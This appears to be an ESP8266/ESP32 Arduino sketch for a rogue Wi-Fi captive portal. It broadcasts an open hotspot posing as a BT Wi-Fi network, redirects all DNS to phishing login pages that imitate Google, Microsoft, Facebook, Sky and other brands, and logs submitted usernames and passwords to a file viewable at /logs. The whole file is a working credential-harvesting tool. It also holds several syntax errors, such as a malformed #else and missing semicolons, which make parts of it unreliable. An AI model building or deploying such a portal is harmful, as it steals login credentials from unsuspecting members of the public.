/*Based on RougeCaptivePortal by Grcasanova - https://github.com/grcasanova/RougeCaptivePortal
 *ESPortal by Corey Harding - www.legacysecuritygroup.com
 *HoneyESP by RiderCZ - https://github.com/ridercz/HoneyESP
 *
 *Harding's original notes...
 * "Configure access point name and up to 3 custom domains and login urls in config.h
 * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
 * Configure the html for any other domain(catch-all) in site_other.h
 * This is only a proof-of-concept.  I am not responsible for your actions.
 * Obey all local, state, federal, and international laws!"
*/

#ifdef ESP8266
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <LittleFS.h>

#else defined(ESP32)
    #include <WiFi.h>
    #include <WebServer.h>
#endif


#include "settings.h"
#include "error.h"
#include "google.h"
#include "plus.h"
#include "bt.h"
#include "microsoft.h"
#include "sky.h"
//#include "sitecaptiveportal.h"
#include "portal_login.h"
#include "facebook.h"
#include "yahoo.h"
#include "starbucks.h"

#define LOGFILE "/log.txt"

/*
 *************************
 * ACCESS POINT SSID
 * ***********************
 */
const char *ssid="BTWi-fi (Wanda)";

/* ****************** *
 * LOGIN CAPTURE PAGE *
 * ****************** */

//Uncomment target phishing page:

#define captivePortalPage PORTAL_LOGIN_HTML
//#define captivePortalPage BT_HTML
//#define captivePortalPage MICROSOFT_HTML
//#define captivePortalPage PLUSNET_HTML
//#define captivePortalPage SKY_HTML
//#define captivePortalPage GOOGLE_HTML
//#define captivePortalPage FACEBOOK_HTML
//#define captivePortalPage YAHOO_HTML
//#define captivePortalPage STARBUCKS_HTML

//Settings page target update
//#define captivePortalPage webServer.arg("target");


// Basic configuration using common network setups (usual DNS port, IP and web server port)
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
#ifdef ESP8266
ESP8266WebServer webServer(80);

#else
WebServer server(80)
#endif

// Buffer strings
String webString="";
String serialString="";

// Blink the builtin LED n times
void blink(int n)
{
  for(int i = 0; i < n; i++)
  {
    digitalWrite(LED_BUILTIN, LOW);    
    delay(250);                    
    digitalWrite(LED_BUILTIN, HIGH);  
    delay(250);
  }
}

void setup() {
  //Start Serial communication
  Serial.begin(115200);
  Serial.println();
  Serial.println("Rouge Captive Portal");
  Serial.println();

  // LED setup
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);  

  // Check platform
  #ifdef ESP8266
     Serial.println("ESP8266");
  #else
     Serial.println("ESP32");
  #endif

  // Initialize file system (LittleFS) and read the log file, if not present create a new one
  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  LittleFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = LittleFS.open(LOGFILE, "r");
  
  if (!f) {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    LittleFS.format();
    // open the file in write mode
    File f = LittleFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");
  
  // Create Access Point
  Serial.print("Creating Access Point...");
 #ifdef ESP8266
  WiFi.setOutputPower(20.5); //maximum output power
  WiFi.mode(WIFI_AP);
 #else
  WiFi.mode(WIFI_MODE_AP;
 #endif 
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" Success!");

  // Start DNS Server
  Serial.print("Starting DNS Server...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);  
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  // Check domain name and refresh page
  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
  webServer.on("/fwlink", handleRoot);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
  webServer.onNotFound(handleRoot);
  
  // Validate-Save USER/PASS combinations
  webServer.on("/validate", []() {
    // store harvested credentials
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    // Sending data to Serial (DEBUG)
    serialString = url+": "+user+":"+pass;
    Serial.println(serialString);

    // Append data to log file
    File f = LittleFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
    // Send an error response to the user after credential harvesting and redirect to error page
    webServer.send_P(200, "text/html", error_HTML);

    // Reset buffer strings
    serialString="";
    webString="";

    blink(5);
  });
// Logging and target pages
  // Logging Page
  webServer.on("/logs", [](){
    webString="<html><body><h1>Captured Logs</h1><hr><pre>";
    File f = LittleFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre><hr><h1><a href='/settings'>Settings</a><hr><a href='/logs/clear'>Clear all logs</a><hr><h1></body></html>";
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });

  // Clear all logs
  webServer.on("/logs/clear", [](){
    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
    File f = SPIFFS.open(LOGFILE, "w");
    f.println("Captured Login Credentials:");
    f.close();
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });
  
// Target setting page
   webServer.on("/settings", [](){
   webServer.send(200, "text/html", SETTINGS_HTML);
   Serial.println("Settings accessed");
  });

// Generic portal redirect link
   
   //Google
   webServer.on("/google", [](){
   webServer.send(200, "text/html", GOOGLE_HTML);
   Serial.println("Google accessed");
  });
  
   //bt
   webServer.on("/bt", [](){
   webServer.send(200, "text/html", BT_HTML);
   Serial.println("BT accessed");
  });
  
  //Microsoft
   webServer.on("/microsoft", [](){
   webServer.send(200, "text/html", MICROSOFT_HTML);
   Serial.println("Microsoft accessed");
  });
  
  //Plusnet
   webServer.on("/plus", [](){
   webServer.send(200, "text/html", PLUSNET_HTML);
   Serial.println("Plusnet accessed");
  });
  
  //Sky
   webServer.on("/sky", [](){
   webServer.send(200, "text/html", SKY_HTML);
   Serial.println("Sky accessed");
  });



  

//------------------------------ Start WebServer -------------------------------------
  
  // Start Webserver
  Serial.print("Starting Web Server...");
  webServer.begin();
  Serial.println(" Success!");
  
  blink(10);
  
  Serial.println("Device Ready!");
}


void loop() {
  // Check for DNS Request/Dish out Web Pages
  dnsServer.processNextRequest();
  webServer.handleClient();
  }

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
  
